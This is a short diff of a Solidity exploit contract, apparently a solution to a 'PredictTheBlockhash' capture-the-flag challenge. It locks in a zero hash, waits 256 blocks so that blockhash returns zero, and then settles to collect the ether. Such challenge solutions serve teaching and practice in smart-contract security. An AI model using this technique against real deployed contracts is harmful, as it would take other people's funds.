@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+import "forge-std/console.sol";
 
 //Challenge
 contract PredictTheBlockhash {
@@ -53,4 +54,15 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+    function lockInGuess() public payable {
+        bytes32 hash = 0;
+        predictTheBlockhash.lockInGuess{value: 1 ether}(hash);
+    }
+
+    function exploit() public {
+        // wait for 256 blocks to pass
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
 }
